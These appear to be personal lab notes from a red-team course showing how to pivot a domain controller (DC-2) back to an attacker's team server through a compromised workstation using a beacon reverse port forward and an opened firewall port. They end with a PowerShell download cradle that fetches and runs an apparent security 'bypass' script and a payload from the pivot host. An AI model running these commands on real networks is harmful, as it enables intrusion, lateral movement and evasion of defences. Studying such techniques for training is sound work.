`Reverse Port Forward` example: for `DC-2` to be able to reach our `Attacker Desktop` the path is followed as below:

`DC-2` -> `WKSTN-2` -> `Attacker Desktop` with utilization of a `Reverse Port Forward`


on DC-2

![[Pasted image 20231204144917.png]]
unable to reach the `Attacker Desktop` directly, need a `reverse port forward`
`iwr -Uri http://10.10.5.50/a`
![[Pasted image 20231204145137.png]]
on `WKSTN-2 beacon` setup a `reverse port forward` with `rportfwd 8080 127.0.0.1 80` 
- redirecting any traffic that is hitting `WKSTN-2` on port `8080` to `127.0.0.1` (Teams Server) on port `80`
![[Pasted image 20231204150655.png]]
checking to ensure that port `8080` is `listening`  `run netstat -anp tcp`
![[Pasted image 20231204150805.png]]
on `WKSTN-2` setup a `FIREWALL` rule to allow port `8080` traffic `in`  `powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080`
- in order to change the `firewall` rules must be an `ADMIN` or `SYSTEM`
![[Pasted image 20231204150954.png]]
can delete `firewall` rule later with `powershell Remove-NetFirewallRule -DisplayName "8080-In"`
can check `firewall` rule names with `powershell Get-NetFirewallRule -DisplayName "8080-In"`
to disable the firewall rule `powershell Remove-NetFirewallRule -DisplayName "8080-In"`


now when testing the connection from `DC-2` to `beacon` through `wkstn-2` we are able to hit it.
`iwr -Uri http://wkstn-2:8080/a`
`iex (new-object net.webclient).downloadstring("http://wkstn-2:8080/bypass"); iex (new-object net.webclient).downloadstring("http://wkstn-2:8080/a")`
![[Pasted image 20231204151245.png]]

